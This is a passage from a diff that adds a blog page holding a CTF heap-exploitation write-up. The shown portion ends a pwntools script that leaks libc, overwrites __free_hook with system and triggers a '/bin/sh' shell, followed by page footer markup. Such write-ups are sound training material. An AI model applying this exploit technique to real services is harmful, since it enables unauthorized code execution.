+        alloc(5,p64(0x30)+p64(0x30)+&#39;\n&#39;)
+        
+
+
+        free(1)
+        show(1)
+        
+        leak2 = u64(target.recv(6).ljust(8,&#39;\x00&#39;))
+        success(hex(leak2))
+        libc_leak = leak2 - 0x3c4b78
+        success(&#34;leaked libc: &#34; + hex(libc_leak))
+        
+
+        system = libc_leak + 0x45390
+        success(&#34;system: &#34; + hex(system))
+        free_hook = libc_leak + libC.symbols[&#39;__free_hook&#39;]
+        success(&#34;free_hook: &#34;+hex(free_hook))
+        
+        edit(4,p64(free_hook)+&#34;\n&#34;)
+        edit(1,p64(system)+&#34;\n&#34;)
+        
+        alloc(8,&#34;/bin/sh\x00&#34;+&#39;\n&#39;)
+        free(8)
+
+        target.interactive()
+
+
+    pwn()
+</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/write-up/>Write-Up</a></li><li><a href=http://localhost:1313/tags/ctf/>Ctf</a></li><li><a href=http://localhost:1313/tags/pwn/>Pwn</a></li><li><a href=http://localhost:1313/tags/heap/>Heap</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/vnctf2021/><span class=title>« Prev</span><br><span>VNCTF2021 Pwn</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share 简单堆题write-up on x" href="https://x.com/intent/tweet/?text=%e7%ae%80%e5%8d%95%e5%a0%86%e9%a2%98write-up&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fheap_writeup%2f&amp;hashtags=write-up%2cctf%2cpwn%2cheap"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 简单堆题write-up on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fheap_writeup%2f&amp;title=%e7%ae%80%e5%8d%95%e5%a0%86%e9%a2%98write-up&amp;summary=%e7%ae%80%e5%8d%95%e5%a0%86%e9%a2%98write-up&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fheap_writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 简单堆题write-up on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fheap_writeup%2f&title=%e7%ae%80%e5%8d%95%e5%a0%86%e9%a2%98write-up"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 简单堆题write-up on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fheap_writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 简单堆题write-up on whatsapp" href="https://api.whatsapp.com/send?text=%e7%ae%80%e5%8d%95%e5%a0%86%e9%a2%98write-up%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fheap_writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 简单堆题write-up on telegram" href="https://telegram.me/share/url?text=%e7%ae%80%e5%8d%95%e5%a0%86%e9%a2%98write-up&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fheap_writeup%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 简单堆题write-up on ycombinator" href="https://news.ycombinator.com/submitlink?t=%e7%ae%80%e5%8d%95%e5%a0%86%e9%a2%98write-up&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fheap_writeup%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>N0k's Den</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
